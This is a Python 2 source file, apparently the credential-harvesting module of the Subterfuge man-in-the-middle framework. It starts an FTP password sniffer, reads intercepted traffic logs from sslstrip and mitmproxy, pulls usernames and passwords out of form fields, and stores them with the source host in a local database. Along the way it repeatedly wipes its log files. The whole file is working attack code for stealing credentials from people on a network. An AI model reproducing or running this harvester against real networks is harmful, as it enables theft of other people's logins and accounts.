#!/usr/bin/python
import os
import re
import sys
sys.path.append('/usr/share/subterfuge')
import time
import datetime
import urllib


  #Ignore Deprication Warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

from django.conf import settings
settings.configure(
DATABASES = {
    'default' : {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': "/usr/share/subterfuge/db",
        'USER': '',
        'PASSWORD': '',
        'HOST': '',
    }
}
)

from django.db import models
from main.models import credentials


def main():
	print "Harvesting Credentials..."
	print "Starting FTP Sniffer"
	os.system("python /usr/share/subterfuge/modules/harvester/ftp_password_sniffer.py")

	#Read in username fields from definitions file
	u = open('/usr/share/subterfuge/definitions/usernamefields.lst', 'r')
	username = u.readlines()
	#Remove all of the new line characters
	tmplst = []
	for h in username:
		tmplst.append(h.rstrip('\n'))
	username = tmplst
	username.remove('')

	#Read in password fields from definitions file
	p = open('/usr/share/subterfuge/definitions/passwordfields.lst', 'r')
	password = p.readlines()
	tmplst2 = []
	#Remove all of the new line characters
	for g in password:
		tmplst2.append(g.rstrip('\n'))
	password = tmplst2
	password.remove('')
	
        #Purge Logs
	os.system("echo > /usr/share/subterfuge/sslstrip.log")
	os.system("echo > /usr/share/subterfuge/mitmproxy.log")
	os.system("rm /usr/share/subterfuge/harvester.log")
	os.system("touch /usr/share/subterfuge/harvester.log")
	logswap = 0
	log = open("/usr/share/subterfuge/harvester.log")

	while 1:
		line = log.readline()
		if len(line) == 0:
			logswap = logswap + 1
			#Purge Logs
			os.system("echo > /usr/share/subterfuge/harvester.log")

			#Consolidate Logs
			if logswap % 2 == 0:
			   os.system("strings -n 10 /usr/share/subterfuge/mitmproxy.log > /usr/share/subterfuge/harvester.log")
			   os.system("echo > /usr/share/subterfuge/mitmproxy.log")

			else:
			   os.system("cat /usr/share/subterfuge/sslstrip.log > /usr/share/subterfuge/harvester.log")
			   os.system("echo > /usr/share/subterfuge/sslstrip.log")

			time.sleep(5)

		user = 'Unknown'
		passwd = 'Unknown'
		source = 'Unknown'
		for i in username:
			if (line.find(i) >= 0): #if it is in the string
				#parse for host
				hoststr = re.findall(r'\(.*?\):', line)
				if (len(hoststr) > 0):
					host = hoststr[0].partition('(')
					hoststr = host[2]
					host = hoststr.partition(')')
					hoststr = host[0]
					source = hoststr

				#parse for the username
				tmpstr = line.partition(i)
				usrpassend = tmpstr[2]
				usrs = []
				usrs.append(usrpassend)
				boolu = 1
				while (boolu):
					if (usrpassend.find(i) >= 0):
						tmpstr = usrpassend.partition(i)
						usrpassend = tmpstr[2]
						usrs.append(usrpassend)
					else:
						boolu = 0

				newusrs = []
				for num in usrs:					
					usrn = re.findall(r'=(.*?)&', num)
					if (len(usrn)):
						if (len(usrn[0]) > 2 and len(usrn[0]) < 32 and usrn[0] != 'adtoken' and usrn[0] != 'true'):
							#print 'added ' + usrn[0]
							newusrs.append(usrn[0])
				
				if ((source.find('yahoo') >= 0 ) and i != 'username'):
					newusrs = []
				
				if (len(newusrs) > 0):
					user = newusrs.pop((len(newusrs) -1))
					user = urllib.unquote(user)
					#print user	
					#begin password section
					for j in password:
						if (line.find('&' + j) >= 0): #if it is in the string
							#parse for the password
							tmpstr2 = line.partition(j)
							passend = tmpstr2[2]
							passes = []
							passes.append(passend)
							boolu2 = 1
							while (boolu2):
								if (passend.find(j) >= 0):
									tmpstr2 = passend.partition(j)
									passend = tmpstr2[2]
									passes.append(passend)
								else:
									boolu2 = 0

							newpasses = []
							for num2 in passes:					
								pas = re.findall(r'=(.*?)&', num2)
								if (len(pas)):
									if (len(pas[0]) > 2 and len(pas[0]) < 46):
										newpasses.append(pas[0])
				
							if (len(newpasses) > 0):
								passwd = newpasses.pop((len(newpasses) -1))
								passwd = urllib.unquote(passwd)
								#print passwd
								reap(source, user, passwd)
								#to prevent duplicate entries being found
								line = ''
							else:
								newpasses2 = []
								for num3 in passes:					
									pas2 = re.findall(r'=(.*?)\n', num3)
									if (len(pas2)):
										if (len(pas2[0]) > 2 and len(pas2[0]) < 46):
											newpasses2.append(pas2[0])
								if (len(newpasses2) > 0):
									passwd = newpasses2.pop((len(newpasses2) -1))
									passwd = urllib.unquote(passwd)
									#print passwd
									reap(source, user, passwd)
									#to prevent duplicate entries being found
									line = ''



#insert into database
def reap(source, username, password):
	now = datetime.datetime.now()
	date = now.strftime("%d-%m-%Y %H:%M")
	logcred = credentials(source = source, username = username, password = password, date = date)
	logcred.save()

def usage(): 

	print "\nSubterfuge courtesy of r00t0v3rr1d3 & 0sm0s1z \n"
	print "Usage: subterfuge [OPTIONS] \n"
	sys.exit(1)

if __name__ == '__main__':
	 main()				
